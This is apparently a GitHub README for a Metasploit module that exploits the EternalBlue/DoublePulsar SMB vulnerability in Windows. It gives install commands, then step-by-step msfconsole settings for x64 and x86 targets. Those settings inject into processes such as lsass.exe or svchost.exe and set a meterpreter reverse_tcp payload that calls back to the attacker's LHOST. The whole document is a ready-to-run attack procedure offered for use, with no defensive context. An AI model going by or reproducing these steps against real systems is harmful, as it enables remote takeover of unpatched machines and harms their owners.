# Eternalblue-Doublepulsar-Metasploit

# How to Install
<pre>
~]# dpkg --add-architecture i386 && apt-get update -y && apt-get install wine32 -y
~]# git clone https://github.com/grglzrv/Eternalblue-Doublepulsar-Metasploit.git
~]# cd Eternalblue-Doublepulsar-Metasploit
~]# cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb

Note !!!: Also copy 'deps' directory to /usr/share/metasploit-framework/modules/exploits/windows/smb

- mkdir -p /root/.wine/drive_c/
</pre>
# How to use
<pre>
~]# service postgresql start
~]# service postgresql enable
~]# msfconsole
- reload_all 
- use exploit/windows/smb/eternalblue_doublepulsar
- show options
</pre>
<br>
 ## + For Windows x64 
<br>
<pre>
 - set RHOST (Target IP)
 - set PROCESSINJECT svchost.exe or set PROCESSINJECT lsass.exe
 - set TARGETARCHITECTURE x64
 - set payload windows/x64/meterpreter/reverse_tcp
 - set LHOST (Local IP, check it with 'ip a')
 - show targets
 - set target 8
 - run or exploit
 </pre>
 ## + For Windows x86
<pre>
 - set RHOST (Target IP)
 - set PROCESSINJECT svchost.exe or set PROCESSINJECT explorer.exe
 - set TARGETARCHITECTURE x86
 - set payload windows/meterpreter/reverse_tcp
 - set LHOST (Local IP, check it with 'ip a')
 - show targets
 - set target 8
 - run or exploit
 </pre>
 ## Have a Fun! :)
